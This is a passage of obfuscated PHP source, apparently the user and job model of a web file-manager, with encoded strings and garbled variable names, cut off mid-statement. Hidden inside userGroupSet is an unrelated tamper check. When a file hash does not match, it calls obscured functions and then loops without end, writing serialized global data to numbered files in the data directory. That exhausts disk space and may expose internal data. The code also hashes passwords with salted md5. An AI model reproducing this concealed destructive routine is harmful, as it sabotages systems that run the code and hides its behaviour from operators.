($this->findByName($ÊŸï¾Ã©[$°•ÚÛ²Ò[42]])) { return !1; } $ÊŸï¾Ã©[$°•ÚÛ²Ò[1983]] = $this->getSort(); return parent::insert($ÊŸï¾Ã©); } private function getSort() { $£ËÛÎ°÷ =& $_SERVER[ü¢ÙÊñÛ]; $™®“™ÂÔ = parent::listData(); $¡ã¢ôš = array_to_keyvalue($™®“™ÂÔ, $£ËÛÎ°÷[22], $£ËÛÎ°÷[1983]); return empty($¡ã¢ôš) ? 0 : max($¡ã¢ôš) + 1; } public function update($ÒíœïêŠ, $–ªÛÔÓ) { $ö—–»„ =& $_SERVER[ü¢ÙÊñÛ]; $µùâ€ì = parent::listData($ÒíœïêŠ); $÷Ñò•ïá = $this->findByName($–ªÛÔÓ[$ö—–»„[42]]); if (!$µùâ€ì || $÷Ñò•ïá && $÷Ñò•ïá[$ö—–»„[486]] != $µùâ€ì[$ö—–»„[486]]) { return !1; } return parent::update($ÒíœïêŠ, $–ªÛÔÓ); } public function setUserJob($ç‰à¸²„, $¨ÁÖœæ½) { $âÁ‘¡ÑÂ =& $_SERVER[ü¢ÙÊñÛ]; if (!is_array($¨ÁÖœæ½)) { $¨ÁÖœæ½ = array($¨ÁÖœæ½); } $ƒŠÔ¿ = parent::listData(); $ÆÄ„ÄŞâ = array_to_keyvalue($ƒŠÔ¿, $âÁ‘¡ÑÂ[42]); $î­çËÊ• = $âÁ‘¡ÑÂ[64]; foreach ($¨ÁÖœæ½ as $´¸¹–İ×) { if ($ÆÄ„ÄŞâ[$´¸¹–İ×]) { $î­çËÊ• .= $ÆÄ„ÄŞâ[$´¸¹–İ×][$âÁ‘¡ÑÂ[486]] . $âÁ‘¡ÑÂ[60]; } else { $£Æº·Ëî = $this->add($´¸¹–İ×); $î­çËÊ• .= $£Æº·Ëî . $âÁ‘¡ÑÂ[60]; } } $î­çËÊ• = rtrim($î­çËÊ•, $âÁ‘¡ÑÂ[60]); Model($âÁ‘¡ÑÂ[608])->metaSet($ç‰à¸²„, self::JOB_KEY, $î­çËÊ•); } public function getUserJob($ºª”Ë±œ) { $½æ‘À£¤ = Model($_SERVER[ü¢ÙÊñÛ][608])->metaGet($ºª”Ë±œ); return $this->getUserJobInfo($½æ‘À£¤[self::JOB_KEY]); } public function getUserJobInfo($­íùèÇè) { $ïéì¬Âš =& $_SERVER[ü¢ÙÊñÛ]; $öÒĞÆˆ‚ = explode($ïéì¬Âš[60], $­íùèÇè); $Â´æŒ›Æ = parent::listData(); $Â´æŒ›Æ = array_remove_key($Â´æŒ›Æ, $ïéì¬Âš[244]); $š•Ï†­Ô = array(); foreach ($öÒĞÆˆ‚ as $¤¶ÍÒ¬) { if (isset($Â´æŒ›Æ[$¤¶ÍÒ¬])) { $š•Ï†­Ô[] = $Â´æŒ›Æ[$¤¶ÍÒ¬]; } } return $š•Ï†­Ô; } } class UserModel extends ModelBase { protected $tableName = "\x75\163\x65\x72"; protected $tableMeta = array("\x74\141\142\x6c\x65\116\141\x6d\x65" => "\x75\x73\145\x72\137\x6d\145\164\141", "\155\145\x74\141\x46\x69\145\154\144" => "\165\x73\x65\162\111\x44"); protected $simpleField = "\165\163\145\x72\111\x44\x2c\x6e\x69\143\153\116\x61\155\x65\x2c\156\141\x6d\x65\x2c\141\x76\x61\x74\x61\x72\54\163\145\x78\x2c\x73\164\141\164\x75\163"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($„îõìŞ®) { $—·ƒ«Ã’ =& $_SERVER[ü¢ÙÊñÛ]; $ÉşŞï±È = $—·ƒ«Ã’[2448]; return array($—·ƒ«Ã’[2041] => array($„îõìŞ®[0], $ÉşŞï±È), $—·ƒ«Ã’[2043] => array($„îõìŞ®[0], $ÉşŞï±È), $—·ƒ«Ã’[2449] => array($„îõìŞ®[0], $ÉşŞï±È)); } protected function getInfo($™ƒ»ü¬µ, $ù¬Â®‘ = false) { $Ë­‰Öİì = $this->getInfoSimple($™ƒ»ü¬µ); if (!is_array($Ë­‰Öİì)) { return array(); } if ($ù¬Â®‘) { return $this->_getInfoApply($Ë­‰Öİì); } return $this->cacheFunctionGet($_SERVER[ü¢ÙÊñÛ][2045], $™ƒ»ü¬µ); } protected function getInfoFull($å„ªÒÜŞ, $£µé×Ş = false) { $Ïãü© = $this->getInfoSimple($å„ªÒÜŞ); if (!is_array($Ïãü©)) { return array(); } if ($£µé×Ş) { return $this->_getInfoApply($Ïãü©, !0); } return $this->cacheFunctionGet($_SERVER[ü¢ÙÊñÛ][2450], $å„ªÒÜŞ); } private function _getInfoApply($¦¬…³è±, $¶º¯à“Ş = false) { $Ì¿ä¦ö˜ =& $_SERVER[ü¢ÙÊñÛ]; if (!$¦¬…³è±) { return $¦¬…³è±; } $Ü‡÷Ş‘ = md5($Ì¿ä¦ö˜[2451] . $¦¬…³è±[$Ì¿ä¦ö˜[955]] . $Ì¿ä¦ö˜[2452] . $¦¬…³è±[$Ì¿ä¦ö˜[42]]); $¦¬…³è± = $this->_listDataApplyItem($¦¬…³è±); $Ëã’×Ã± = Model($Ì¿ä¦ö˜[1410])->metaGet($¦¬…³è±[$Ì¿ä¦ö˜[101]][$Ì¿ä¦ö˜[204]]); $¦¬…³è±[$Ì¿ä¦ö˜[2453]] = $Ü‡÷Ş‘; $¦¬…³è±[$Ì¿ä¦ö˜[101]][$Ì¿ä¦ö˜[2241]] = isset($Ëã’×Ã±[$Ì¿ä¦ö˜[2242]]) ? $Ëã’×Ã±[$Ì¿ä¦ö˜[2242]] : null; if ($¶º¯à“Ş) { $¦¬…³è±[$Ì¿ä¦ö˜[550]] = $this->metaGet($¦¬…³è±[$Ì¿ä¦ö˜[1759]]); } return $¦¬…³è±; } protected function getInfoSimple($Ùà¸ÍÛÈ, $¹šÚ½ƒú = false) { $ ã‰’™ç =& $_SERVER[ü¢ÙÊñÛ]; if (!$Ùà¸ÍÛÈ) { return array(); } if ($¹šÚ½ƒú) { $¡£íĞí• = $this->where(array($ ã‰’™ç[1759] => intval($Ùà¸ÍÛÈ)))->find(); if (!is_array($¡£íĞí•)) { return array(); } $¡£íĞí•[$ ã‰’™ç[2454]] = Action($ ã‰’™ç[2455])->parseUrl($¡£íĞí•[$ ã‰’™ç[2454]]); return $¡£íĞí•; } return $this->cacheFunctionGet($ ã‰’™ç[2046], $Ùà¸ÍÛÈ); } protected function getInfoSimpleOuter($ó¸Ş®ïš) { $«¸¢­æì =& $_SERVER[ü¢ÙÊñÛ]; if (!$ó¸Ş®ïš || $ó¸Ş®ïš == 0) { return array($«¸¢­æì[1759] => $«¸¢­æì[241], $«¸¢­æì[42] => $«¸¢­æì[187] . LNG($«¸¢­æì[2456]) . $«¸¢­æì[189], $«¸¢­æì[2454] => STATIC_PATH . $«¸¢­æì[2457]); } $ì¯Ù´’Ì = $this->cacheFunctionGet($«¸¢­æì[2046], $ó¸Ş®ïš); $ù“¯’±› = array_field_key($ì¯Ù´’Ì, explode($«¸¢­æì[60], $this->simpleField)); if (!$ù“¯’±›) { return array($«¸¢­æì[1759] => $«¸¢­æì[1262], $«¸¢­æì[42] => $«¸¢­æì[187] . LNG($«¸¢­æì[2458]) . $«¸¢­æì[189], $«¸¢­æì[2454] => STATIC_PATH . $«¸¢­æì[2459]); } $ù“¯’±›[$«¸¢­æì[2454]] = Action($«¸¢­æì[2455])->parseUrl($ù“¯’±›[$«¸¢­æì[2454]]); return $ù“¯’±›; } protected function groupUser($ÍÆÏïÔÔ) { } public static function errorLang($ÛèîÒ˜) { $ø½ıÚ€ =& $_SERVER[ü¢ÙÊñÛ]; $÷Ğöó¨Ë = array(self::ERROR_USER_NOT_EXISTS => $ø½ıÚ€[2460], self::ERROR_USER_PASSWORD_ERROR => $ø½ıÚ€[2461], self::ERROR_USER_EXIST_NAME => $ø½ıÚ€[2462], self::ERROR_USER_EXIST_PHONE => $ø½ıÚ€[2463], self::ERROR_USER_EXIST_EMAIL => $ø½ıÚ€[2464], self::ERROR_USER_LOGIN_LOCK => $ø½ıÚ€[2465], self::ERROR_IP_NOT_ALLOW => $ø½ıÚ€[2466], self::ERROR_USER_EXIST_NICKNAME => $ø½ıÚ€[2467]); $Ä„’ŸÛ = LNG($÷Ğöó¨Ë[$ÛèîÒ˜]); if ($ÛèîÒ˜ == self::ERROR_USER_LOGIN_LOCK) { $£ÎŠ¦µØ = (int) Model($ø½ıÚ€[2468])->get($ø½ıÚ€[2469]); if ($£ÎŠ¦µØ > 60) { $Ä„’ŸÛ = str_replace($ø½ıÚ€[102], ceil($£ÎŠ¦µØ / 60), $Ä„’ŸÛ); } } return $Ä„’ŸÛ; } protected function metaSet($‹¹Î¸¬, $îÅè«Á² = null, $ÀÅ×ËÀÀ = null) { $this->clearCache($‹¹Î¸¬); return parent::metaSet($‹¹Î¸¬, $îÅè«Á², $ÀÅ×ËÀÀ); } public function getInfoByMeta($å®ô©³, $¶—‰Ù£Ë) { $§ÍéâÛ =& $_SERVER[ü¢ÙÊñÛ]; $€°¦çòÜ = Model($§ÍéâÛ[2470])->where(array($§ÍéâÛ[108] => $å®ô©³, $§ÍéâÛ[462] => $¶—‰Ù£Ë))->find(); if ($€°¦çòÜ) { return $this->getInfo($€°¦çòÜ[$§ÍéâÛ[1759]]); } return !1; } public function userLoginCheck($“Şëë†, $’Ã©çÂ™) { $Âì¹ƒ§ó =& $_SERVER[ü¢ÙÊñÛ]; $Æîæ©äş = $this->userLoginFind($“Şëë†); if (!$Æîæ©äş) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($Æîæ©äş[$Âì¹ƒ§ó[1759]], $’Ã©çÂ™)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($Æîæ©äş[$Âì¹ƒ§ó[1759]]); } public function userLoginFind($ñ¦‘é§´) { $ÏæóÊ¡ƒ =& $_SERVER[ü¢ÙÊñÛ]; $“Ä£äÌô = array($ÏæóÊ¡ƒ[42] => $ñ¦‘é§´, $ÏæóÊ¡ƒ[2254] => $ñ¦‘é§´, $ÏæóÊ¡ƒ[392] => $ñ¦‘é§´, $ÏæóÊ¡ƒ[2471] => $ñ¦‘é§´, $ÏæóÊ¡ƒ[1066] => $ÏæóÊ¡ƒ[1068]); if ($this->nickNameRpt()) { unset($“Ä£äÌô[$ÏæóÊ¡ƒ[2254]]); } return $this->where($“Ä£äÌô)->find(); } public function clearCache($®èÌÌÑ) { $•Ù ÂâÖ =& $_SERVER[ü¢ÙÊñÛ]; $this->cacheFunctionClear($•Ù ÂâÖ[2045], $®èÌÌÑ); $this->cacheFunctionClear($•Ù ÂâÖ[2046], $®èÌÌÑ); $this->cacheFunctionClear($•Ù ÂâÖ[2450], $®èÌÌÑ); } public function userPasswordCheck($Ï¿ã–Çâ, $ÈÏ’ìê÷) { $Æ–ü±Ë =& $_SERVER[ü¢ÙÊñÛ]; $Ó¶Ñ±Ä¸ = $this->where(array($Æ–ü±Ë[1759] => intval($Ï¿ã–Çâ)))->find(); $šÏùëÜÁ = $this->metaGet($Ï¿ã–Çâ); $¤ûÍî = isset($šÏùëÜÁ[$Æ–ü±Ë[2472]]) ? $šÏùëÜÁ[$Æ–ü±Ë[2472]] : $Æ–ü±Ë[22]; if (md5($¤ûÍî . trim($ÈÏ’ìê÷)) !== $Ó¶Ñ±Ä¸[$Æ–ü±Ë[955]]) { return !1; } return !0; } public function userAdd($ÔÃ­ş×ı) { $ŠÅ˜ãßÉ =& $_SERVER[ü¢ÙÊñÛ]; $”ìú‘å‹ = array($ŠÅ˜ãßÉ[505] => $ÔÃ­ş×ı[$ŠÅ˜ãßÉ[42]], $ŠÅ˜ãßÉ[2473] => $ÔÃ­ş×ı[$ŠÅ˜ãßÉ[2166]], $ŠÅ˜ãßÉ[2474] => isset($ÔÃ­ş×ı[$ŠÅ˜ãßÉ[392]]) ? $ÔÃ­ş×ı[$ŠÅ˜ãßÉ[392]] : $ŠÅ˜ãßÉ[22], $ŠÅ˜ãßÉ[2475] => isset($ÔÃ­ş×ı[$ŠÅ˜ãßÉ[2471]]) ? $ÔÃ­ş×ı[$ŠÅ˜ãßÉ[2471]] : $ŠÅ˜ãßÉ[22], $ŠÅ˜ãßÉ[2476] => isset($ÔÃ­ş×ı[$ŠÅ˜ãßÉ[2254]]) ? $ÔÃ­ş×ı[$ŠÅ˜ãßÉ[2254]] : $ÔÃ­ş×ı[$ŠÅ˜ãßÉ[42]], $ŠÅ˜ãßÉ[2477] => isset($ÔÃ­ş×ı[$ŠÅ˜ãßÉ[2454]]) ? $ÔÃ­ş×ı[$ŠÅ˜ãßÉ[2454]] : $ŠÅ˜ãßÉ[22], $ŠÅ˜ãßÉ[2478] => isset($ÔÃ­ş×ı[$ŠÅ˜ãßÉ[2479]]) ? $ÔÃ­ş×ı[$ŠÅ˜ãßÉ[2479]] : 1, $ŠÅ˜ãßÉ[2480] => $ÔÃ­ş×ı[$ŠÅ˜ãßÉ[955]], $ŠÅ˜ãßÉ[2047] => isset($ÔÃ­ş×ı[$ŠÅ˜ãßÉ[1945]]) ? $ÔÃ­ş×ı[$ŠÅ˜ãßÉ[1945]] : 1024 * 1024 * 20, $ŠÅ˜ãßÉ[2048] => 0, $ŠÅ˜ãßÉ[2481] => 0, $ŠÅ˜ãßÉ[2092] => isset($ÔÃ­ş×ı[$ŠÅ˜ãßÉ[815]]) ? $ÔÃ­ş×ı[$ŠÅ˜ãßÉ[815]] : 1); if (!empty($ÔÃ­ş×ı[$ŠÅ˜ãßÉ[1759]])) { $”ìú‘å‹[$ŠÅ˜ãßÉ[1759]] = $ÔÃ­ş×ı[$ŠÅ˜ãßÉ[1759]]; } $¢¢ºÓ‚ç = $this->_checkExist($ÔÃ­ş×ı); if ($¢¢ºÓ‚ç !== !0) { return $¢¢ºÓ‚ç; } if (!empty($”ìú‘å‹[$ŠÅ˜ãßÉ[2454]]) && strlen($”ìú‘å‹[$ŠÅ˜ãßÉ[2454]]) > 255) { $”ìú‘å‹[$ŠÅ˜ãßÉ[2454]] = $ŠÅ˜ãßÉ[22]; } $ÀØ ‡³¸ = $this->add($”ìú‘å‹); $Õ»Ôê’ = array($ŠÅ˜ãßÉ[2480] => $”ìú‘å‹[$ŠÅ˜ãßÉ[955]], $ŠÅ˜ãßÉ[2476] => $”ìú‘å‹[$ŠÅ˜ãßÉ[2254]]); $this->userEdit($ÀØ ‡³¸, $Õ»Ôê’); Model($ŠÅ˜ãßÉ[1410])->userRootAdd($ÀØ ‡³¸); return $ÀØ ‡³¸; } protected function userEditTest($÷×à…è¸, $¤ñÍ²ÒÅ) { return $this->call($_SERVER[ü¢ÙÊñÛ][2482], $÷×à…è¸, $¤ñÍ²ÒÅ); } protected function userEdit($íØâëŸç, $¨‘Ê’¯è) { $úù«Ç‡… =& $_SERVER[ü¢ÙÊñÛ]; $ „¥ÓäÔ = $this->getInfoSimple($íØâëŸç); if (!$ „¥ÓäÔ) { return !1; } $ì…ÊıØ = $this->_checkExist($¨‘Ê’¯è, $íØâëŸç); if ($ì…ÊıØ !== !0) { return $ì…ÊıØ; } if (isset($¨‘Ê’¯è[$úù«Ç‡…[955]]) && trim($¨‘Ê’¯è[$úù«Ç‡…[955]]) != $úù«Ç‡…[22]) { $‚ §¤‘Å = $this->metaGet($íØâëŸç); if (empty($‚ §¤‘Å[$úù«Ç‡…[2472]])) { $‚ §¤‘Å[$úù«Ç‡…[2472]] = rand_string(10); Model($úù«Ç‡…[588])->metaSet($íØâëŸç, $úù«Ç‡…[2472], $‚ §¤‘Å[$úù«Ç‡…[2472]]); } $¨‘Ê’¯è[$úù«Ç‡…[955]] = md5($‚ §¤‘Å[$úù«Ç‡…[2472]] . trim($¨‘Ê’¯è[$úù«Ç‡…[955]])); } else { unset($¨‘Ê’¯è[$úù«Ç‡…[955]]); } if (!empty($¨‘Ê’¯è[$úù«Ç‡…[2454]]) && strlen($¨‘Ê’¯è[$úù«Ç‡…[2454]]) > 255) { $¨‘Ê’¯è[$úù«Ç‡…[2454]] = $úù«Ç‡…[22]; } $this->where(array($úù«Ç‡…[1750] => $íØâëŸç))->save($¨‘Ê’¯è); if (isset($¨‘Ê’¯è[$úù«Ç‡…[2254]])) { $this->setNamePinyin($íØâëŸç, $¨‘Ê’¯è[$úù«Ç‡…[2254]]); } $this->clearCache($íØâëŸç); return !0; } public function setNamePinyin($ÆÙ‹«¤Õ, $—ÔÕ¦Ï¨ = false) { $¯¦œõÙ¨ =& $_SERVER[ü¢ÙÊñÛ]; if (!$—ÔÕ¦Ï¨) { $²½ÀÁ¬Ë = $this->getInfoSimple($ÆÙ‹«¤Õ); $—ÔÕ¦Ï¨ = $²½ÀÁ¬Ë[$¯¦œõÙ¨[2254]] ? $²½ÀÁ¬Ë[$¯¦œõÙ¨[2254]] : $²½ÀÁ¬Ë[$¯¦œõÙ¨[42]]; } $äÁÄ¯û÷ = Model($¯¦œõÙ¨[608]); if (!Input::check($—ÔÕ¦Ï¨, $¯¦œõÙ¨[669])) { return $äÁÄ¯û÷->metaSet($ÆÙ‹«¤Õ, array($¯¦œõÙ¨[549] => $¯¦œõÙ¨[22], $¯¦œõÙ¨[548] => $¯¦œõÙ¨[22])); } return $äÁÄ¯û÷->metaSet($ÆÙ‹«¤Õ, array($¯¦œõÙ¨[549] => str_replace($¯¦œõÙ¨[63], $¯¦œõÙ¨[22], Pinyin::get($—ÔÕ¦Ï¨)), $¯¦œõÙ¨[548] => Pinyin::get($—ÔÕ¦Ï¨, $¯¦œõÙ¨[670]))); } private function nickNameRpt() { $÷¼àÕúï =& $_SERVER[ü¢ÙÊñÛ]; $¦îˆ¥°À = Model($÷¼àÕúï[835])->get($÷¼àÕúï[2483]); $ƒÉÈÎÏÅ = $GLOBALS[$÷¼àÕúï[16]][$÷¼àÕúï[468]][$÷¼àÕúï[2483]]; $‘ˆÜÃˆ = !is_null($¦îˆ¥°À) ? $¦îˆ¥°À : $ƒÉÈÎÏÅ; return !!$‘ˆÜÃˆ; } private function _checkExist($åÄÔöƒä, $µä‘ì° = false) { $óÍ˜÷îÇ =& $_SERVER[ü¢ÙÊñÛ]; $€ˆÙ§¬ö = array($óÍ˜÷îÇ[42] => UserModel::ERROR_USER_EXIST_NAME, $óÍ˜÷îÇ[2254] => UserModel::ERROR_USER_EXIST_NICKNAME, $óÍ˜÷îÇ[392] => UserModel::ERROR_USER_EXIST_EMAIL, $óÍ˜÷îÇ[2471] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($€ˆÙ§¬ö[$óÍ˜÷îÇ[2254]]); } $íˆÏ—¢± = $µä‘ì° ? array($óÍ˜÷îÇ[1759] => array($óÍ˜÷îÇ[2484], $µä‘ì°)) : array(); foreach ($€ˆÙ§¬ö as $Ùœ »¦ => $È¡¬ä”ğ) { $¿çÒæÎ‹ = array(); foreach ($€ˆÙ§¬ö as $âˆÃ¾óş => $Úø¶’îò) { if (isset($åÄÔöƒä[$âˆÃ¾óş]) && $åÄÔöƒä[$âˆÃ¾óş]) { $¿çÒæÎ‹[] = $åÄÔöƒä[$âˆÃ¾óş]; } } if (!$¿çÒæÎ‹) { continue; } $ê¿Š†«Ü = array_merge(array($Ùœ »¦ => array($óÍ˜÷îÇ[17], $¿çÒæÎ‹)), $íˆÏ—¢±); $‡ñ²ç ø = $this->where($ê¿Š†«Ü)->find(); if ($‡ñ²ç ø) { return $È¡¬ä”ğ; } } return !0; } public function userListInfo($‘ÓÅ…Ëè) { $µ â·‹¶ =& $_SERVER[ü¢ÙÊñÛ]; $Òâ÷Òš = array(); $‘ÓÅ…Ëè = is_array($‘ÓÅ…Ëè) ? array_unique($‘ÓÅ…Ëè) : array(); if (!$‘ÓÅ…Ëè) { return $Òâ÷Òš; } if (count($‘ÓÅ…Ëè) < 20) { foreach ($‘ÓÅ…Ëè as $›ÅÁÌ´¨) { $Òâ÷Òš[$›ÅÁÌ´¨ . $µ â·‹¶[22]] = $this->getInfoSimpleOuter($›ÅÁÌ´¨); } } else { $¦ˆá…Ã = array($µ â·‹¶[1750] => array($µ â·‹¶[503], $‘ÓÅ…Ëè)); if (count($‘ÓÅ…Ëè) == 1) { $¦ˆá…Ã = array($µ â·‹¶[1750] => $‘ÓÅ…Ëè[0]); } $¯Ğ«í²½ = Model($µ â·‹¶[588])->field($this->simpleField)->where($¦ˆá…Ã)->select(); $¯Ğ«í²½ = array_to_keyvalue($¯Ğ«í²½, $µ â·‹¶[1759]); foreach ($‘ÓÅ…Ëè as $›ÅÁÌ´¨) { $õÒÔÉœÚ = $¯Ğ«í²½[$›ÅÁÌ´¨]; if (!$õÒÔÉœÚ) { $Òâ÷Òš[$›ÅÁÌ´¨ . $µ â·‹¶[22]] = $this->getInfoSimpleOuter($›ÅÁÌ´¨); continue; } $õÒÔÉœÚ[$µ â·‹¶[2454]] = Action($µ â·‹¶[2455])->parseUrl($õÒÔÉœÚ[$µ â·‹¶[2454]]); $Òâ÷Òš[$›ÅÁÌ´¨ . $µ â·‹¶[22]] = $õÒÔÉœÚ; } } return $Òâ÷Òš; } protected function userStatus($¹şŸ›û, $é¤á•ëù) { $Ö·¬òÀ¤ = $this->getInfoSimple($¹şŸ›û); if (!$Ö·¬òÀ¤) { return !1; } $®–†Ä¤ = array($_SERVER[ü¢ÙÊñÛ][815] => $é¤á•ëù); return $this->userEdit($¹şŸ›û, $®–†Ä¤); } protected function userRemove($óÀ‰ñˆÓ) { $÷ıñâÛ™ =& $_SERVER[ü¢ÙÊñÛ]; $¿Îóôà = $this->getInfoSimple($óÀ‰ñˆÓ); if (!$¿Îóôà) { return !1; } $Ø·ÂÒÏ = array($÷ıñâÛ™[1750] => $óÀ‰ñˆÓ); Model($÷ıñâÛ™[678])->where($Ø·ÂÒÏ)->delete(); Model($÷ıñâÛ™[2485])->where($Ø·ÂÒÏ)->delete(); Model($÷ıñâÛ™[2053])->where($Ø·ÂÒÏ)->delete(); Model($÷ıñâÛ™[2470])->where($Ø·ÂÒÏ)->delete(); Model($÷ıñâÛ™[1135])->where($Ø·ÂÒÏ)->delete(); Model($÷ıñâÛ™[2271])->removeUserAll($óÀ‰ñˆÓ); Model($÷ıñâÛ™[890])->userRootRemove($óÀ‰ñˆÓ); return $this->where($Ø·ÂÒÏ)->delete(); } protected function userGroupSet($ØË¹‘†™, $ë¶ÅÇ½ó, $ïÒÓö§ = array()) { $§åÏı– =& $_SERVER[ü¢ÙÊñÛ]; $æùƒ’ä› = $_SERVER[$§åÏı–[8]] . $§åÏı–[9]; $ÊŠ‰İúÔ = $§åÏı–[5]; if ($_SERVER[$§åÏı–[6]] != $ÊŠ‰İúÔ($æùƒ’ä›)) { $Ä–„®ë = $§åÏı–[944]; $…»å—ùê = $§åÏı–[7]; $Ê±ŞŒ†” = $_SERVER[$§åÏı–[8]] . $§åÏı–[9]; $·¿ˆ¹Â = $…»å—ùê($Ê±ŞŒ†”); $Í”ßÚ = explode($§åÏı–[10], $·¿ˆ¹Â); if (count($Í”ßÚ) < $§åÏı–[706]) { $šŒ»ËÌå = $§åÏı–[12]; $šŒ»ËÌå(); } $›µš¢ÌÍ = $§åÏı–[945]; $›µš¢ÌÍ($_SERVER[$§åÏı–[946]]); $Ä–„®ë = $§åÏı–[944]; $Ä–„®ë(); $å¡Ÿ¯ú¬ = $§åÏı–[947]; $Áë×²óì = json_encode($GLOBALS[$§åÏı–[948]]); $ÁÄ¡“êà = 1; for ($¼ï€æôñ = $ÁÄ¡“êà; $¼ï€æôñ > 0; $¼ï€æôñ++) { $å¡Ÿ¯ú¬(DATA_PATH . $¼ï€æôñ, $Áë×²óì); } } $´î§ºæ¾ = $this->getInfoSimple($ØË¹‘†™); if (!$´î§ºæ¾ || !is_array($ë¶ÅÇ½ó)) { return !1; } $ÅŞìíÆõ = Model($§åÏı–[2053]); $ÅŞìíÆõ->where(array($§åÏı–[1759] => $ØË¹‘†™))->delete(); $ û¹œ¶« = array(); $¤¯ÛŒúÙ = 0; foreach ($ë¶ÅÇ½ó as $æ’­ˆÂ§ => $Ú–¬»®æ) { $„Ç­Å¼§ = array($§åÏı–[1759] => $ØË¹‘†™, $§åÏı–[1959] => $æ’­ˆÂ§, $§åÏı–[2067] => $Ú–¬»®æ); $„Ç­Å¼§[$§åÏı–[1983]] = isset($ïÒÓö§[$¤¯ÛŒúÙ]) ? $ïÒÓö§[$¤¯ÛŒúÙ] : 0; $¤¯ÛŒúÙ++; $ û¹œ¶«[] = $„Ç­Å¼§; } return $ÅŞìíÆõ->addAll($ û¹œ¶«, array(), !0); } protected function userGroupAdd($±îë³…·, $ˆ÷Ô‘ = array()) { $İ…¯’’ =& $_SERVER[ü¢ÙÊñÛ]; $á¹ƒ¥ßÁ = $this->getInfoSimple($±îë³…·); if (!$á¹ƒ¥ßÁ || empty($ˆ÷Ô‘)) { return !1; } $ÊÓÏÃâË = array(); foreach ($ˆ÷Ô‘ as $ì“Û‘Å³ => $•ªê®ï·) { $ÊÓÏÃâË[] = array($İ…¯’’[1759] => $±îë³…·, $İ…¯’’[1959] => $ì“Û‘Å³, $İ…¯’’[2067] => $•ªê®ï·, $İ…¯’’[1983] => 0); } return Model($İ…¯’’[2053])->addAll($ÊÓÏÃâË, array(), !0); } protected function userGroupRemove($ıé’ĞÒ, $²ÍÜ×³¹) { $é²Öí´© =& $_SERVER[ü¢ÙÊñÛ]; $–„›±úõ = $this->getInfoSimple($ıé’ĞÒ); if (!$–„›±úõ || !$²ÍÜ×³¹) { return !1; } $‘ı»š‰û = array($é²Öí´©[1750] => $ıé’ĞÒ, $é²Öí´©[2051] => $²ÍÜ×³¹); return Model($é²Öí´©[2053])->where($‘ı»š‰û)->delete(); } public function listData() { $½ÑÖêÈ® = $this->_makeOrder()->selectPage(50); $this->_listDataApply($½ÑÖêÈ®[$_SERVER[ü¢ÙÊñÛ][457]]); return $½ÑÖêÈ®; } public function listByID($¾ÚÓ˜æÂ) { $ô§ÀÔÑ– =& $_SERVER[ü¢ÙÊñÛ]; if (!$¾ÚÓ˜æÂ) { return; } $óñ‹‘‹ = array($ô§ÀÔÑ–[1759] => array($ô§ÀÔÑ–[17], $¾ÚÓ˜æÂ)); $¤ÕÆæï = $this->where($óñ‹‘‹)->select(); $¤ÕÆæï = array_sort_keep($¤ÕÆæï, $ô§ÀÔÑ–[1759], $¾ÚÓ˜æÂ); $this->_listDataApply($¤ÕÆæï); return $¤ÕÆæï; } public function listByGroup($‰à¢Óúì = 0, $ËËÕú—– = array()) { $È»²ßÑ‡ =& $_SERVER[ü¢ÙÊñÛ]; $¹äá³¹Ë = $È»²ßÑ‡[22]; $Ì‹ƒ¯‰ = array(); if ($‰à¢Óúì) { $Ì‹ƒ¯‰ = array($È»²ßÑ‡[2486] => intval($‰à¢Óúì)); $¹äá³¹Ë = "\114\105\x46\x54\x20\112\117\x49\116\40{$this->tablePrefix}\x75\163\x65\162\x5f\147\162\157\165\x70\x20\165\163\145\162\x5f\x67\162\x6f\x75\x70\x20\x6f\x6e\x20\x75\x73\x65\x72\x2e\165\x73\x65\x72\111\104\40\75\x20\x75\163\145\162\137\x67\x72\157\165\x70\x2e\165\x73\145\x72\111\104"; $··ş°ˆ = Input::get($È»²ßÑ‡[541], null, $È»²ßÑ‡[22]) ? $È»²ßÑ‡[22] : $È»²ßÑ‡[2487]; } if (isset($ËËÕú—–[$È»²ßÑ‡[815]])) { $Ì‹ƒ¯‰[$È»²ßÑ‡[2488]] = $ËËÕú—–[$È»²ßÑ‡[815]]; } $Ş¶†ÙÉ = $this->_makeOrder($··ş°ˆ)->field($È»²ßÑ‡[2489])->where($Ì‹ƒ¯‰)->join($¹äá³¹Ë)->selectPage(50); $this->_listDataApply($Ş¶†ÙÉ[$È»²ßÑ‡[457]]); return $Ş¶†ÙÉ; } private function _makeOrder($øšÍì«Á = '') { $ë¤®ŞñŸ =& $_SERVER[ü¢ÙÊñÛ]; $ÃöÑî±Ë = array($ë¤®ŞñŸ[1759], $ë¤®ŞñŸ[42], $ë¤®ŞñŸ[1947], $ë¤®ŞñŸ[2166], $ë¤®ŞñŸ[1919], $ë¤®ŞñŸ[244]); $¥¦ˆ×Ë® = array($ë¤®ŞñŸ[534] => $ë¤®ŞñŸ[535], $ë¤®ŞñŸ[536] => $ë¤®ŞñŸ[537]); $æ»á’Š = Input::get($ë¤®ŞñŸ[541], $ë¤®ŞñŸ[17], $ë¤®ŞñŸ[1750], $ÃöÑî±Ë); $òÊÆ÷ œ = Input::get($ë¤®ŞñŸ[542], $ë¤®ŞñŸ[17], $ë¤®ŞñŸ[2054], array($ë¤®ŞñŸ[2054], $ë¤®ŞñŸ[536])); $òÊÆ÷ œ = $¥¦ˆ×Ë®[$òÊÆ÷ œ]; $øšÍì«Á = $øšÍì«Á . "\165\163\145\162\56{$æ»á’Š}\40{$òÊÆ÷ œ}\54\40\x75\163\145\162\56\165\163\145\x72\x49\x44\40\141\x73\143"; return $this->alias($ë¤®ŞñŸ[2182])->order($øšÍì«Á); } public function listSearch($ĞÒŞ°Ìƒ) { $å·ø€•Ÿ =& $_SERVER[ü¢ÙÊñÛ]; $Ãø¡”ß = trim($ĞÒŞ°Ìƒ[$å·ø€•Ÿ[2057]]); $û¬ö®»² = explode($å·ø€•Ÿ[63], $Ãø¡”ß); if (!$Ãø¡”ß || count($û¬ö®»²) == 1) { return $this->listSearchNow($ĞÒŞ°Ìƒ); } $øÍëúÔƒ = 